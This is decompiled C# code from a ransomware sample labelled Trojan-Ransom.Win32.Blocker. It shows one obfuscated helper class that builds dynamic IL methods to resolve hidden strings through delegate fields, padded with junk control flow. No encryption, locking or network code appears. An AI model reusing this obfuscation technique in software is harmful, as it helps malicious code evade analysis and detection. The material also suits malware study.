// Decompiled with JetBrains decompiler
// Type: .
// Assembly: SEX2, Version=0.0.0.0, Culture=neutral, PublicKeyToken=a5787988e1da7ee4
// MVID: 027F678B-7D46-4866-9354-BA5F76CF2B30
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare.00060-msil\Trojan-Ransom.Win32.Blocker.asdg-51ed8d1a92fbb8f059c9595d28994dd3b17eb92e.exe

using \u0001;
using System;
using System.Reflection;
using System.Reflection.Emit;
using System.Runtime.InteropServices;

namespace \u0001
{
  internal static class \u0004
  {
    public static void \u0002([In] Type obj0)
    {
      Type[] typeArray1;
      DynamicMethod dynamicMethod1;
      ILGenerator ilGenerator1;
      MethodInfo[] methods;
      int index1;
      MethodInfo meth;
      FieldInfo fieldInfo1;
      int index2;
      FieldInfo[] fields;
      try
      {
        do
        {
          fields = obj0.GetFields(BindingFlags.Static | BindingFlags.NonPublic | BindingFlags.GetField);
          index2 = 0;
        }
        while (false);
        for (; index2 < fields.Length; ++index2)
        {
          fieldInfo1 = fields[index2];
label_4:
          try
          {
            while ((object) fieldInfo1.FieldType == (object) typeof (\u0002))
            {
              string empty = string.Empty;
              Type returnType = typeof (string);
              typeArray1 = new Type[1]{ typeof (int) };
              Type[] parameterTypes = typeArray1;
              Type owner = obj0;
              dynamicMethod1 = new DynamicMethod(empty, returnType, parameterTypes, owner, true);
              ilGenerator1 = dynamicMethod1.GetILGenerator();
              ilGenerator1.Emit(OpCodes.Ldarg_0);
              methods = typeof (\u0006).GetMethods(BindingFlags.Static | BindingFlags.Public);
              index1 = 0;
              while (true)
              {
                int num1 = index1;
                int num2;
                while (true)
                {
                  int num3 = methods.Length;
                  int num4;
                  while (true)
                  {
                    num4 = num3;
                    if (false)
                      num3 = num4;
                    else
                      break;
                  }
                  if (num1 < num4)
                    meth = methods[index1];
                  else
                    goto label_18;
label_7:
                  if ((object) meth.ReturnType == (object) typeof (string))
                  {
                    if (true)
                    {
                      ilGenerator1.Emit(OpCodes.Ldc_I4, fieldInfo1.MetadataToken & 16777215);
                      ilGenerator1.Emit(OpCodes.Sub);
                      ilGenerator1.Emit(OpCodes.Call, meth);
                    }
                    else
                      goto label_4;
                  }
                  else
                  {
                    int num5 = index1;
                    while (true)
                    {
                      num2 = num5 + 1;
                      if (true)
                      {
                        if (false)
                          num5 = num2;
                        else
                          goto label_13;
                      }
                      else
                        break;
                    }
                    num1 = num2;
                    continue;
                  }
label_18:
                  ilGenerator1.Emit(OpCodes.Ret);
                  fieldInfo1.SetValue((object) null, (object) dynamicMethod1.CreateDelegate(typeof (\u0002)));
                  if (false)
                    goto label_7;
                  else
                    goto label_19;
                }
label_13:
                index1 = num2;
              }
label_19:
              return;
            }
          }
          catch
          {
          }
        }
      }
      catch (Exception ex)
      {
        FieldInfo fieldInfo2 = fieldInfo1;
        DynamicMethod dynamicMethod2 = dynamicMethod1;
        ILGenerator ilGenerator2 = ilGenerator1;
        MethodInfo methodInfo = meth;
        FieldInfo[] fieldInfoArray = fields;
        // ISSUE: variable of a boxed type
        __Boxed<int> local1 = (ValueType) index2;
        Type[] typeArray2 = typeArray1;
        MethodInfo[] methodInfoArray = methods;
        // ISSUE: variable of a boxed type
        __Boxed<int> local2 = (ValueType) index1;
        Type type = obj0;
        \u0008.\u0008.\u0002(ex, (object) fieldInfo2, (object) dynamicMethod2, (object) ilGenerator2, (object) methodInfo, (object) fieldInfoArray, (object) local1, (object) typeArray2, (object) methodInfoArray, (object) local2, (object) type);
        throw;
      }
    }
  }
}
